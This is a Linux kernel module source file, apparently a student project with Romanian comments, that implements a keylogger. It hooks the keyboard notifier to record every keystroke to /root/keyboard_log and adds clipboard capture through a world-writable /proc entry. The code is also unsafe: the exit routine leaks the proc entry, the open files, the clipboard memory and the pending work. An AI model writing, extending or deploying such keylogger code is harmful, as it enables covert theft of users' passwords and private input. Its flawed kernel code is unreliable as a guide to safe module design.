#include "struct_keylogger.h"
#include "keyboard_callback.h"
#include "write_to_file.h"
#include "struct_clipboard.h"
#include "clipboard_callback.h"
#include "write_to_file_clipboard.h"

#define LOG_FILE_PATH "/root/keyboard_log"
#define CLIPBOARD_FILENAME "/proc/keyboard_clipboard"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Raluca+Bogdan");
MODULE_DESCRIPTION("Un simplu modul pentru logarea tastelor");

static struct KEYLOGGER *keylogger;
static struct CLIPBOARD *clipboard;

static int __init keyboard_logger_init(void) 
{
    keylogger=kzalloc(sizeof(KEYLOGGER),GFP_KERNEL);//kzalloc seteaza cu 0 peste tot
    if(keylogger==NULL)
    {
        pr_err("Nu se poate aloca memorie pt keylogger\n");
        return -ENOMEM;
    }

    keylogger->key_notifier.notifier_call=keyboard_callback;
    
    INIT_WORK(&keylogger->work_struct,&write_to_file);//leaga workqueue cu functia(handler)

    if(IS_ERR(keylogger->filename = filp_open(LOG_FILE_PATH, O_CREAT | O_RDWR, 0644)))
    {
        pr_info("Unable to create a log file\n");
    	return -EINVAL;
	}
    keylogger->keyboard_read_buffer=keylogger->main_buffer;
    keylogger->write_buffer=keylogger->back_buffer;
    register_keyboard_notifier(&keylogger->key_notifier);

    //************ADAUGARE CLIPBOARD*******//

    clipboard=kzalloc(sizeof(CLIPBOARD),GFP_KERNEL);
     if(clipboard==NULL)
    {
        pr_err("Nu se poate aloca memorie pt clipboard\n");
        return -ENOMEM;
    }
    clipboard->associeted_keylogger=keylogger;
    clipboard->clipboard_entry=proc_create("keyboard_clipboard", 0666, NULL, &clipboard_fops); //handler pt gestionarea posibilelor operatii de citire
    if (!clipboard->clipboard_entry) {
        pr_err("Failed to create /proc/keyboard_clipboard.\n");
        return -ENOMEM;
    }

    INIT_WORK(&clipboard->work_clipboard,&write_to_file_clipboard);

    if(IS_ERR(clipboard->filename=filp_open(CLIPBOARD_FILENAME,O_CREAT| O_RDWR, 0664)))
    {
        pr_info("Unable to create a clipboard file\n");
    	return -EINVAL;
    }

    clipboard->clipboard_read_buffer=clipboard->main_clipboard_buffer;
    clipboard->clipboard_write_buffer=clipboard->back_clipboard_buffer;

    //pr_info("Keyboard logger with clipboard support started.\n");
    

    return 0;
}

static void __exit keyboard_logger_exit(void) 
{
    unregister_keyboard_notifier(&keylogger->key_notifier);
    kfree(keylogger);
}

module_init(keyboard_logger_init);
module_exit(keyboard_logger_exit);